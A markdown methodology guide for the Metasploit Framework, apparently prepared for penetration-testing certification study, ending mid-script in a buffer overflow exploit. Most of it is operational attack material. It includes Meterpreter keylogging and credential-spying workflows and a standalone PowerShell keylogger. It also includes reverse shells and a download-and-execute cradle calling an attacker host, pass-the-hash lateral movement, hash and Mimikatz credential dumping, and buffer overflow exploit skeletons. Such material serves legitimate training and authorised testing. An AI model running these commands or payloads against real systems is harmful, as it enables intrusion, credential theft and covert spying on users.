# Metasploit Framework Methodology

Complete reference for Metasploit usage in CPTS engagements. Covers msfconsole workflow, database integration, Meterpreter, and LOTL alternatives where Metasploit is impractical or noisy.

Cross-references:
- [msfvenom payload generation](shells-and-payloads.md)
- [post-exploitation techniques](windows-methodology.md)
- [domain abuse modules](active-directory-methodology.md)
- [bypassing detection of msf payloads](av-evasion.md)

---

## Phase 0: msfconsole Core Commands

### Launching

```bash
# Initialize database (first time only)
sudo msfdb init

# Start msfconsole
msfconsole
msfconsole -q                  # quiet (no banner)
msfconsole -r script.rc        # run resource script on start
msfconsole -x "use exploit/multi/handler; set PAYLOAD ...; exploit"  # execute and stay
```

### Database & Workspace

```text
msf6 > db_status               # confirm DB connected
msf6 > workspace               # list workspaces
msf6 > workspace -a <CLIENT>   # add new
msf6 > workspace <CLIENT>      # switch
msf6 > workspace -d <CLIENT>   # delete
msf6 > workspace -r old new    # rename
```

### Host / Service / Vuln / Loot Tracking

```text
msf6 > hosts                              # list discovered hosts
msf6 > hosts -R                           # populate RHOSTS from list
msf6 > hosts -S 10.10.10                  # search
msf6 > hosts -d <TARGET>                  # delete

msf6 > services                           # list services
msf6 > services -p 445                    # filter by port
msf6 > services -p 445 -R                 # populate RHOSTS with port-445 hosts
msf6 > services -s smb -c port,proto,info # custom columns

msf6 > vulns                              # discovered vulns
msf6 > notes                              # arbitrary notes
msf6 > loot                               # collected loot (hashes, configs)
msf6 > creds                              # credential store
msf6 > creds add user:<USER> password:<PASSWORD> realm:<DOMAIN>
msf6 > creds -t ntlm                      # filter by type
```

### Built-in Nmap

```text
msf6 > db_nmap -sV -sC -p- <TARGET>
msf6 > db_nmap -sV --script vuln <TARGET>
# Results auto-populate hosts/services/vulns
```

### Importing External Scans

```text
msf6 > db_import /path/to/nmap.xml
msf6 > db_import /path/to/nessus.nessus
msf6 > db_import /path/to/openvas.xml
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 1: Module Taxonomy

| Type | Path Prefix | Purpose |
|------|-------------|---------|
| **exploit** | `exploit/` | Trigger vulnerability, deliver payload |
| **auxiliary** | `auxiliary/` | Scan, fuzz, sniff, brute-force (no payload) |
| **post** | `post/` | Run after session is established |
| **payload** | `payload/` | Code that runs on target after exploit |
| **encoder** | `encoder/` | Obfuscate payload bytes |
| **nop** | `nop/` | Generate NOP sled for exploit dev |
| **evasion** | `evasion/` | Generate AV-evading executables |

### Module Ranking (excellent → manual)

| Rank | Reliability |
|------|-------------|
| `excellent` | Never crashes target, reliable |
| `great` | Default for most cases |
| `good` | Works well but limited tested versions |
| `normal` | Works but not refined |
| `average` | Less reliable |
| `low` | Very specific conditions |
| `manual` | Requires manual intervention to succeed |

```text
msf6 > search type:exploit rank:excellent platform:windows smb
```

### Search Operators

```text
msf6 > search ms17-010                          # CVE/MS bulletin
msf6 > search type:exploit name:eternalblue
msf6 > search cve:2021-34527                    # PrintNightmare
msf6 > search platform:linux type:exploit rank:excellent
msf6 > search path:auxiliary/scanner/smb
msf6 > search author:zerosum0x0
msf6 > search app:server                        # client / server
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 2: Module Workflow

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info       # full details
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > show advanced
msf6 exploit(ms17_010_eternalblue) > show targets
msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > show evasion

msf6 exploit(ms17_010_eternalblue) > set RHOSTS <TARGET>
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(ms17_010_eternalblue) > set LHOST tun0
msf6 exploit(ms17_010_eternalblue) > set LPORT 443

msf6 exploit(ms17_010_eternalblue) > check       # vulnerability check w/o exploitation
msf6 exploit(ms17_010_eternalblue) > exploit     # foreground
msf6 exploit(ms17_010_eternalblue) > exploit -j  # background as job
msf6 exploit(ms17_010_eternalblue) > exploit -j -z   # background + don't interact
msf6 exploit(ms17_010_eternalblue) > run         # alias for exploit
```

### Global vs Local Variables

```text
msf6 > setg LHOST <ATTACKER_IP>             # set globally for all modules
msf6 > setg RHOSTS <SUBNET>/24
msf6 > unsetg LHOST
msf6 > save                              # persist globals to ~/.msf4/config

msf6 module > set LPORT 443              # set within current module only
msf6 module > unset LPORT
```

### Session Management

```text
msf6 > sessions                          # list
msf6 > sessions -i 1                     # interact
msf6 > sessions -u 1                     # upgrade shell to meterpreter
msf6 > sessions -k 1                     # kill
msf6 > sessions -K                       # kill all
msf6 > sessions -c "whoami /priv"        # run command in all sessions
msf6 > sessions -C "getuid;sysinfo" -i 1 # multi-cmd
msf6 > jobs                              # list backgrounded handlers
msf6 > jobs -k <JOB_ID>                  # kill job
```

### Background / Resume

```text
meterpreter > background                 # back to msf prompt (Ctrl+Z)
msf6 > sessions -i 1                     # resume
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 3: Resource Scripts and Automation

### Resource Script Basics

```ruby
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
set EnableStageEncoding true
exploit -j -z
```

```bash
msfconsole -q -r handler.rc
```

### AutoRunScript

```text
msf6 exploit(handler) > set AutoRunScript "post/windows/manage/migrate"
msf6 exploit(handler) > set InitialAutoRunScript "post/windows/gather/hashdump"
```

### Console Logging

```text
msf6 > set ConsoleLogging true
msf6 > set LogLevel 5
msf6 > set SessionLogging true
msf6 > setg TimestampOutput true
# Logs: ~/.msf4/logs/console.log, ~/.msf4/logs/sessions/
```

### Multi-Handler That Doesn't Exit

```text
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set ExitOnSession false           # critical for sprays / multiple callbacks
msf6 > exploit -j -z
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 4: Database-Backed Workflow

```bash
# Init / start
sudo msfdb init
sudo msfdb start
sudo msfdb status
sudo msfdb reinit                  # nuke and recreate
```

```text
# Inside msfconsole
msf6 > db_status
msf6 > workspace -a engagement-2026-04
msf6 > db_nmap -sV -sC -p- <SUBNET>/24

# Pivot scan results into module RHOSTS
msf6 > services -p 445 -R
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > run

# Credential reuse
msf6 > creds add user:<USER> password:<PASSWORD>
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set USER_FILE /tmp/users.txt
msf6 > set PASS_FILE /tmp/passes.txt
msf6 > services -p 445 -R
msf6 > run
# Successful logins auto-populate creds DB
```

### Importing Nmap XML

```bash
nmap -sV -sC -oA scan <SUBNET>/24
```

```text
msf6 > db_import scan.xml
msf6 > services
msf6 > vulns
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 5: Meterpreter Essentials

### Identity / Process

```text
meterpreter > getuid                   # current user token
meterpreter > getpid                   # current PID
meterpreter > sysinfo                  # OS, arch, domain
meterpreter > getsystem                # NT AUTHORITY\SYSTEM via named pipe / token
meterpreter > getsystem -t 1           # specific technique (1-4)
meterpreter > rev2self                 # drop back to original token
meterpreter > ps                       # process list
meterpreter > migrate <PID>            # hop to another process
meterpreter > migrate -N explorer.exe  # by name
meterpreter > kill <PID>
```

### Filesystem

```text
meterpreter > pwd / lpwd
meterpreter > cd / lcd
meterpreter > ls / dir
meterpreter > cat C:\\Windows\\win.ini
meterpreter > download C:\\loot\\flag.txt /tmp/
meterpreter > upload /tmp/winpeas.exe C:\\Windows\\Temp\\
meterpreter > edit <FILE>
meterpreter > search -f *.kdbx -d C:\\Users
meterpreter > timestomp -v <FILE>
```

### Networking

```text
meterpreter > ipconfig
meterpreter > netstat
meterpreter > arp
meterpreter > route
meterpreter > portfwd add -l 13389 -p 3389 -r <TARGET>   # local→remote
meterpreter > portfwd list
meterpreter > portfwd flush
meterpreter > run autoroute -s <SUBNET>/24                # add subnet via session
meterpreter > run autoroute -p                              # show routes
```

### Privilege & Credential Access

```text
meterpreter > hashdump                  # local SAM hashes
meterpreter > load kiwi
meterpreter > creds_all                 # full Mimikatz dump
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use <FILE>
meterpreter > golden_ticket_create -d <DOMAIN> -k <KRBTGT_HASH> -s <SID> -u <USER> -t /tmp/golden.tck

meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"
meterpreter > rev2self
```

### Screenshare / Keylogging / Interactive Session Spying

Migrate into a Session-1 (console-interactive) process to capture credentials as they are typed into RDP, runas prompts, or GUI applications. The target process must run in the same session as the interactive desktop.

```text
# Identify session-1 interactive processes (look for Session column = 1)
meterpreter > ps
# Typical targets: explorer.exe, winlogon.exe (session 1), mstsc.exe, credential-prompting apps

# Migrate into an interactive desktop process for GUI/keyboard access
meterpreter > migrate -N explorer.exe
# Or by PID if multiple explorer instances exist
meterpreter > migrate <PID>

# Live screen capture — single frame
meterpreter > screenshot
# Saves .jpeg to local loot dir; verify with: loot command in msfconsole

# Live screen stream (real-time desktop view in browser)
meterpreter > screenshare
# Opens browser window streaming the target desktop via HTTP; Ctrl+C to stop

# Keylogging — start capture, wait for user to type creds, then dump
meterpreter > keyscan_start
# Wait for target user activity (login prompt, runas, web form, etc.)
meterpreter > keyscan_dump
# Repeat keyscan_dump as needed to collect more keystrokes
meterpreter > keyscan_stop
```

Full credential-spying workflow (migrate, screenshot to confirm login prompt, keylog the password):

```text
meterpreter > ps
# Find winlogon.exe or LogonUI.exe in Session 1 → note <PID>
meterpreter > migrate <PID>
meterpreter > screenshot
# Confirm target is at a login/credential prompt
meterpreter > keyscan_start
# Wait for user to authenticate...
meterpreter > keyscan_dump
# Output: typed username + password in cleartext
meterpreter > keyscan_stop
```

#### Living-off-the-land / LOTL variant

No pure LOTL equivalent exists for real-time screen streaming; however, keylogging and screenshots are achievable via PowerShell and native APIs from a SYSTEM shell without uploading tools.

```powershell
# Screenshot via .NET (runs from any PowerShell session with desktop access)
Add-Type -AssemblyName System.Windows.Forms
$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bmp.Size)
$bmp.Save("C:\Windows\Temp\ss.png")
$gfx.Dispose(); $bmp.Dispose()
```

```powershell
# Keylogger via GetAsyncKeyState (P/Invoke, no external binary)
# Must run in the interactive session context (Session 1)
$code = @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
'@
$API = Add-Type -MemberDefinition $code -Name 'KL' -Namespace Win32 -PassThru
$log = "C:\Windows\Temp\kl.txt"
while ($true) {
    for ($k = 8; $k -le 190; $k++) {
        if ($API::GetAsyncKeyState($k) -eq -32767) {
            $c = [char]$k; Add-Content -Path $log -Value $c -NoNewline
        }
    }
    Start-Sleep -Milliseconds 30
}
# Retrieve later: type C:\Windows\Temp\kl.txt
```

```powershell
# Query interactive sessions to find the right session ID before migrating/injecting
query user
# Or from cmd:
qwinsta
```

### Background Tasks / Scripts

```text
meterpreter > bg                                   # alias for background
meterpreter > bgrun post/windows/gather/hashdump   # run post in background
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run persistence -h
```

### Pivoting from Meterpreter

```text
meterpreter > run autoroute -s 172.16.50.0/24
meterpreter > bg
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5
msf6 > set SRVPORT 9050
msf6 > run -j
# Then on attacker:
proxychains -q nmap -sT -Pn 172.16.50.10
```

### Transport Switching (HTTPS → TCP fallback mid-session)

Use case: HTTPS C2 is detected/blocked by network controls — add a raw TCP transport on the live session and rotate without re-exploiting.

```text
meterpreter > transport list                                       # show current + queued transports
meterpreter > transport add -t reverse_tcp -l <ATTACKER_IP> -p 4444   # queue a raw TCP transport
meterpreter > transport add -t reverse_https -l <ATTACKER_IP> -p 443 -ua "Mozilla/5.0"
meterpreter > transport next                                       # rotate to the next transport
meterpreter > transport prev                                       # rotate backward
meterpreter > transport remove -i 2                                # remove transport by index
meterpreter > transport change -t reverse_tcp -l <ATTACKER_IP> -p 4444  # replace current transport
```

Start matching listeners on the attacker BEFORE rotating — otherwise the session dies on switch:

```text
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 4444
msf6 > set ExitOnSession false
msf6 > exploit -j -z
```

Staged vs stageless transport rules:
- Staged payload (`windows/x64/meterpreter/reverse_https`, slash-form) — handler must be staged. New transport added with `transport add` is also staged.
- Stageless (`windows/x64/meterpreter_reverse_https`, underscore-form) — handler must be stageless. The full meterpreter DLL is already in-process; transports just rotate the C2 channel.

### Session Timeouts and Sleep / Jitter

```text
meterpreter > get_timeouts                                  # show current values
meterpreter > set_timeouts -e 604800 -s 86400 -c 300 -x 3600 -y 30
#   -e <expiry>        session expiration (seconds)        e.g. 604800 = 7 days
#   -s <session_exp>   session communication timeout       e.g. 86400 = 24h idle before death
#   -c <comm_timeout>  per-comm-channel timeout            e.g. 300 = 5min
#   -x <retry_total>   total retry window on failure       e.g. 3600 = retry for 1h
#   -y <retry_wait>    wait between retries                e.g. 30 = 30s sleep + jitter
```

Pair with stage-encoded HTTPS for low-and-slow C2:
```text
msf6 > set EnableStageEncoding true
msf6 > set StageEncoder x86/shikata_ga_nai
msf6 > set SessionCommunicationTimeout 86400
msf6 > set SessionExpirationTimeout 604800
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 6: Post-Exploitation Modules

### Recon

```text
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run

msf6 > use post/windows/gather/enum_logged_on_users
msf6 > use post/windows/gather/enum_domain
msf6 > use post/windows/gather/enum_av_excluded
msf6 > use post/windows/gather/checkvm
msf6 > use post/linux/gather/enum_system
msf6 > use post/linux/gather/enum_configs
```

### Credential Access

```text
msf6 > use post/windows/gather/credentials/credential_collector
msf6 > use post/windows/gather/smart_hashdump
msf6 > use post/windows/gather/lsa_secrets
msf6 > use post/windows/gather/cachedump
msf6 > use post/windows/gather/credentials/mimikatz
msf6 > use post/multi/gather/firefox_creds
msf6 > use post/multi/gather/chrome_cookies
msf6 > use post/linux/gather/hashdump
msf6 > use post/linux/gather/enum_users_history
```

### Lateral Movement / Persistence

```text
msf6 > use exploit/windows/smb/psexec               # Pass-the-hash / cleartext
msf6 > set RHOSTS <TARGET>
msf6 > set SMBUser Administrator
msf6 > set SMBPass <LM_HASH>:<NT_HASH>               # NT hash for PtH
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > exploit

msf6 > use exploit/windows/smb/psexec_psh
msf6 > use exploit/windows/local/persistence_service
msf6 > use post/windows/manage/migrate
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 > set SESSION 2
msf6 > run
```

### AD-Specific

```text
msf6 > use auxiliary/gather/kerberos_enumusers      # username enum
msf6 > use auxiliary/scanner/smb/smb_login          # spray
msf6 > use auxiliary/admin/kerberos/get_ticket      # AS-REP / Kerberoast
msf6 > use post/windows/gather/credentials/domain_hashdump
msf6 > use auxiliary/admin/dcerpc/cve_2022_26923_certifried
```

### PtH Command Execution via Routed Pivot (psexec_command + smb_delivery)

auxiliary/admin/smb/psexec_command is the quieter cousin of exploit/windows/smb/psexec — registers a service that runs a single command string (no service binary dropped), then removes itself. Pair with exploit/windows/smb/smb_delivery to land an in-memory payload via SMB-hosted DLL without any on-disk drop on the target.

```text
# Prereq — meterpreter session on a host that can reach <INTERNAL_TARGET>:445
meterpreter > run autoroute -s <INTERNAL_SUBNET>/24
# or, from msfconsole prompt:
msf6 > route add <INTERNAL_TARGET>/32 <SESSION_ID>
msf6 > route print
```

#### Variant A — Pure PtH Command Execution (No Payload Host Needed)

Use when target already has a reachable binary (e.g. you uploaded nc.exe earlier, or a LOLBAS path is callable).

```text
msf6 > use auxiliary/admin/smb/psexec_command
msf6 > set RHOSTS <INTERNAL_TARGET>
msf6 > set RPORT 445
msf6 > set SMBUser <USER>
msf6 > set SMBPass <NT_HASH>
msf6 > set SMBDomain .
msf6 > set SMBSHARE C$
msf6 > set COMMAND "<APP_PATH>\\nc64.exe <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe"
msf6 > run
# Catch on attacker: nc -nvlp <ATTACKER_PORT> → SYSTEM shell
```

#### Variant B — smb_delivery One-Liner (No On-Disk Drop on Target)

smb_delivery hosts a stageless DLL on a local SMB share and prints a rundll32 one-liner. Push that one-liner via psexec_command using the hash.

```text
msf6 > use exploit/windows/smb/smb_delivery
msf6 > set SRVHOST <ATTACKER_IP>
msf6 > set SRVPORT 445
msf6 > set SHARE <SHARE>
msf6 > set FILE_NAME <FILE_NAME>.dll
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 443
msf6 > exploit -j
# Note the printed command, e.g.:
#   rundll32.exe \\<ATTACKER_IP>\<SHARE>\<FILE_NAME>.dll,0
```

```text
msf6 > use auxiliary/admin/smb/psexec_command
msf6 > set RHOSTS <INTERNAL_TARGET>
msf6 > set SMBUser <USER>
msf6 > set SMBPass <NT_HASH>
msf6 > set SMBDomain .
msf6 > set COMMAND "rundll32.exe \\\\<ATTACKER_IP>\\<SHARE>\\<FILE_NAME>.dll,0"
msf6 > run
# → meterpreter session (SYSTEM via SCM) lands on the smb_delivery handler
```

#### Variant C — Standard psexec via Routed Pivot (Drops Service Binary)

```text
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <INTERNAL_TARGET>
msf6 > set SMBUser <USER>
msf6 > set SMBPass <NT_HASH>
msf6 > set SMBDomain .
msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 > set LPORT 4444
msf6 > exploit
```

> Tip: psexec_command is much quieter than psexec — no service binary is dropped, only a service is registered to run a command string and is removed after.

> OPSEC: smb_delivery on SRVPORT 445 will fight any local SMB service on the attacker box — stop smbd first or pick an alternate listen IP. The rundll32 SMB-DLL pattern is heavily signatured by EDR — for engagements use a custom DLL loader instead.

#### Living-Off-the-Land Alternative — Impacket + Manual SMB Host

```bash
# psexec_command equivalent — atexec runs a command via Task Scheduler, no service registered
impacket-atexec -hashes :<NT_HASH> <DOMAIN>/<USER>@<INTERNAL_TARGET> "<APP_PATH>\\nc64.exe <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe"

# smb_delivery equivalent — host a DLL with impacket-smbserver, trigger via wmiexec/atexec
impacket-smbserver <SHARE> /tmp/payload -smb2support
impacket-wmiexec -hashes :<NT_HASH> <DOMAIN>/<USER>@<INTERNAL_TARGET> "rundll32.exe \\\\<ATTACKER_IP>\\<SHARE>\\<FILE_NAME>.dll,0"
```

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 7: msfvenom Integration

See [full msfvenom reference](shells-and-payloads.md) in shells-and-payloads.md. Key integration points:

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o p.exe

# In parallel, start matching handler
cat > h.rc <<EOF
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 443
set ExitOnSession false
exploit -j -z
EOF
msfconsole -q -r h.rc
```

> **Critical:** Payload type and LHOST/LPORT in handler MUST match generated payload exactly. Mismatch = no callback.

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 8: Common Pitfalls

| Pitfall | Symptom | Fix |
|---------|---------|-----|
| Staged vs stageless mismatch | Stage downloads but session never opens | Use `_reverse_tcp` (slash) handler for staged; `meterpreter_reverse_tcp` (underscore) handler for stageless |
| LHOST = 127.0.0.1 | Session opens then dies | Set `LHOST` to interface IP / VPN IP (`tun0`) |
| Wrong payload arch | Crash on exploit | Match target arch (`x64` vs `x86`) — check via `systeminfo` |
| ExitOnSession=true on spray | First callback closes handler | `set ExitOnSession false` |
| AV detects payload | "Exploit completed but no session" | Use `reverse_https`, template injection (`-x`), donut, sgn — see [AV evasion techniques](av-evasion.md) |
| `set PAYLOAD` after `exploit` | Old payload runs | Re-set payload, reload module |
| SOCKS proxy hangs | Pivoted scans time out | Use `-sT` (TCP connect), avoid SYN scans through proxychains |
| Meterpreter session unstable | Drops after 30 sec | `migrate` to a long-lived process (`spoolsv.exe`, `explorer.exe`) |
| `getsystem` fails | UAC / token restriction | Try alternate technique `getsystem -t 1..4`, or use `local_exploit_suggester` |

### LOTL Alternatives to Common Modules

| Metasploit Module | LOTL / Manual Equivalent |
|-------------------|--------------------------|
| `exploit/windows/smb/psexec` | `impacket-psexec`, `impacket-smbexec`, `impacket-wmiexec`, `nxc smb -x` |
| `exploit/windows/smb/ms17_010_eternalblue` | `worawit/MS17-010` python scripts |
| `exploit/multi/handler` | `nc -lvnp`, `pwncat-cs`, `socat`, `ncat --ssl` |
| `auxiliary/scanner/smb/smb_login` | `nxc smb <SUBNET> -u U -p P`, `hydra -L u -P p smb://<TARGET>` |
| `auxiliary/scanner/ssh/ssh_login` | `hydra -L u -P p ssh://<TARGET>`, `ncrack ssh://<TARGET>` |
| `post/windows/gather/hashdump` | `secretsdump.py`, `reg save HKLM\\SAM ... && impacket-secretsdump -sam ...` |
| `post/multi/recon/local_exploit_suggester` | manual `systeminfo` + WES-NG, `winpeas`, `linpeas` |
| `auxiliary/admin/kerberos/get_ticket` | `impacket-GetUserSPNs`, `impacket-GetNPUsers`, `Rubeus.exe kerberoast` |

When operating against EDR-monitored hosts, prefer impacket / nxc / Rubeus equivalents — Metasploit modules are heavily signatured.

[↑ Back to top](#metasploit-framework-methodology)

---

## Phase 9: Buffer Overflow Offset Workflow

For exploit-dev sub-tasks (CPTS BoF box, custom service crash analysis): find EIP/RIP offset, locate jump gadget, generate shellcode opcodes.

### Step 1: Generate cyclic pattern

```bash
msf-pattern_create -l 200                       # pattern of length 200
msf-pattern_create -l 5000 > pattern.txt        # save to file for fuzzing harness
```

### Step 2: Crash target, capture EIP/RIP from debugger (Immunity / x64dbg / gdb)

```python
# Example fuzzer snippet to send the pattern
import socket
p = open('pattern.txt').read()
s = socket.socket(); s.connect(('<TARGET>', 9999))
s.send(b'TRUN /.:/' + p.encode()); s.close()
```

### Step 3: Resolve offset from captured EIP value

```bash
msf-pattern_offset -l 200 -q 39654138           # EIP=0x39654138 → exact offset
msf-pattern_offset -l 5000 -q 0x72433372        # also accepts 0x-prefixed
```

### Step 4: Find a JMP ESP / JMP RSP gadget, generate opcode with nasm_shell

```bash
msf-nasm_shell
nasm > jmp esp                                  # → 00000000  FFE4   jmp esp
nasm > jmp rsp                                  # → 00000000  FFE4   jmp rsp
nasm > pop eax; pop ebx; ret                    # multi-instruction gadget
nasm > add esp, 0x10                            # stack adjust
# Use \xff\xe4 as the EIP overwrite value (account for endianness when patching buffer)
```

### Step 5: Generate shellcode with bad-char filtering

```bash
# List bad chars discovered via the standard 0x01..0xff badchar test
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -e x86/shikata_ga_nai

# Stageless meterpreter for in-memory exec
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 \
  -b '\x00\x0a\x0d' -f python -v shellcode

# Egg-hunter (when buffer space is too small for full shellcode)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 \
  -b '\x00\x0a\x0d' -f raw | msf-egghunter -p w00tw00t -f c
```

### Step 6: Stage shellcode into a meterpreter session via local exploit

```text
# After landing a low-priv shell, inject stageless payload into a target PID
msf6 > use exploit/windows/local/payload_inject
msf6 > set SESSION 1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 443
msf6 > set PID 4892                              # target process for injection
msf6 > set NEWPROCESS false                      # inject into existing PID
msf6 > exploit
```

### Final exploit buffer skeleton

```python
import socket
offset   = 2003                                  # from msf-pattern_offset
eip      = b'\xaf\x11\x50\x62'                   # JMP ESP gadget addr (little-endian)
nopsled  = b'\x90' * 32
shellcode = b'\xfc\xe8...'                       # from msfvenom -b badchars

buf = b'A'*offset + eip + nopsled + shellcode
s = socket.socket(); s.connect(('<TARGET>', 9999))
s.send(b'TRUN /.:/' + buf); s.close()
```

### Step 7: Unicode-restricted BOF — x86/unicode_mixed encoder with BufferRegister alignment

When the target buffer overflow filters non-unicode-safe bytes (wchar/MFC parsers, ANSI-to-Unicode conversion in service input), standard `x86/shikata_ga_nai` shellcode mangles. Switch to the unicode-aware encoder family.

```bash
# https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
# Standard unicode-mixed encoder — accepts mixed ASCII case, requires BufferRegister to point to start of shellcode
msfvenom -a x86 --platform Windows \
  -p windows/exec CMD='powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>/<PAYLOAD>.ps1\")"' \
  -e x86/unicode_mixed \
  -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' \
  BufferRegister=EAX \
  -f python -v shellcode

# Unicode-uppercase encoder — when target also uppercases input (e.g. ToUpper before parsing)
msfvenom -a x86 --platform Windows -p windows/exec CMD='calc.exe' \
  -e x86/unicode_upper -b '\x00' BufferRegister=EAX -f c

# List unicode-aware encoders
msfvenom --list encoders | grep -i unicode
```

> **Tip:** When `x86/shikata_ga_nai` produces shellcode that crashes the target instead of executing, suspect a unicode/wchar conversion in the parser. Indicator: hex dump of the buffer after parsing shows your bytes interleaved with `0x00` (ANSI->Unicode pattern). Switch to `x86/unicode_mixed` + `BufferRegister`.

#### BufferRegister selection

```text
# After triggering the crash in a debugger, identify which register points into your buffer
# at the moment of EIP overwrite (or after a JMP into the shellcode area).
# The encoder's decoder stub uses that register to locate its own code post-conversion.
# Common values: EAX, EBX, ECX, EDX, ESI, EDI, ESP
#   - JMP ESP gadget → after ret, ESP points to shellcode → BufferRegister=ESP
#   - pop-pop-ret SEH chain ending with EAX into buffer → BufferRegister=EAX
#   - In Immunity/x64dbg: examine register dump at the JMP, find the one whose value is inside your A's
```

#### Unicode-restricted BOF workflow (delta vs Phase 9 standard flow)

```text
# 1. Standard offset discovery (msf-pattern_create / msf-pattern_offset) — no change
# 2. Bad-char test — but expect ALL high bytes (0x80-0xff) to mangle, plus 0x00
# 3. Find a unicode-safe return address — the address of your JMP gadget itself must contain
#    only unicode-safe bytes, OR a venetian-style address with 00 padding that survives wchar conversion
#    Example: 0x004012FF survives ANSI->Unicode (high byte 00 becomes literal null, then padded)
# 4. Generate shellcode with x86/unicode_mixed + BufferRegister=<reg pointing to shellcode>
# 5. Patch generated bytes into exploit script in place of standard shikata-encoded shellcode
```

#### Final exploit buffer skeleton — unicode BOF variant

```python
import socket
offset = <OFFSET>                                  # from msf-pattern_offset
ret    = b'\xff\x40\x00'                           # unicode-safe JMP gadget address (little-endian, safe bytes only)
align  = b'\x6a\x00\x58'                           # optional align stub (push 0; pop eax) to set BufferRegister
shellcode = b'PPYAIAIAIA...'                       # output of msfvenom -e x86/unicode_mixed BufferRegister=EAX

buf = b'A'*offset + ret + align + shellcode
s = socket.socket(); s.connect(('<TARGET>', <PORT>))
s.send(buf); s.close()
```

### Step 8: Heap-spray + egghunter chain (vulnerable buffer smaller than shellcode)

When the corruptible buffer is too small for full shellcode but the process accepts a secondary input that lands bytes anywhere in process memory (heap, .data, parser cache), spray the real payload via the secondary ingress and trigger via a tiny egghunter BOF.

```bash
# Generate the egghunter stub (32-bit Windows, scans VA space for TAG+TAG marker)
# The 4-byte TAG must appear TWICE at the start of the real shellcode
msf-egghunter -p <EGG_TAG> -f python
# https://github.com/rapid7/metasploit-framework

# Generate the real shellcode that the egghunter will jump to once located
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> \
  -b '\x00\x0a\x0d' -f python -v shellcode
```

```python
# Two-stage exploit: spray real shellcode via secondary ingress, then trigger tiny egghunter BOF
from pwn import remote, p32
import zlib

target     = '<TARGET>'
port       = <ATTACKER_PORT>
buflen     = <BUF_OFFSET>                        # from msf-pattern_offset
jmp_reg    = p32(0x<JMP_GADGET>)                 # JMP ESP / JMP EAX in non-ASLR module
TAG        = b'<EGG_TAG>'                        # 4-byte marker, must match -p flag above
egghunter  = b'<EGGHUNTER_BYTES>'                # output of msf-egghunter
shellcode  = TAG + TAG + b'<MSFVENOM_SHELLCODE>' # double tag prefix is mandatory

# Stage A: spray real payload via secondary ingress (HTTP body in this example)
